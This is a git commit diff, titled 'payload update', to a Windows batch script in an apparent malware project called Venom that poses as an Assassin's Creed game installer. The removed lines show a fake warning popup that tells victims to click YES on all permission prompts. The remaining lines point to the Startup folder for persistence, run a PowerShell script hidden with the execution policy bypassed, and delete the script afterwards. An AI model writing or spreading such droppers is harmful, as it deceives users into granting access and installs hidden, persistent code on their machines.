fab0789a6c0ae2de020897ed1975ca448a12846a
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-03-03 16:18:53 -0900

    payload update

--- Venom/initial1.cmd
+++ Venom/initial1.cmd
@@ -1,8 +1,5 @@
 @echo off
 
-echo x=msgbox("A very small percentage of individuals may experience epileptic seizures exposed to certain light patterns or flashing lights. -- IMMEDIATELY discontinue use and consult your physician before resuming pla!!",0,"ASSASSIN'S CREED::WARNING BEFORE PLAYING") WScript.Sleep 3000 ("Make sure to give the game the necessary permissions by clicking YES on all the popups if they are not passed through.",0,"**ASSASSIN'S CREED INSTALLATION**")>>msgbox.vbs
-start msgbox.vbs
-
 set "INITIALPATH=%cd%"
 set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
@@ -16,5 +13,4 @@ powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
 
 cd "%INITIALPATH%"
 
-del msgbox.vbs
 del initial1.cmd
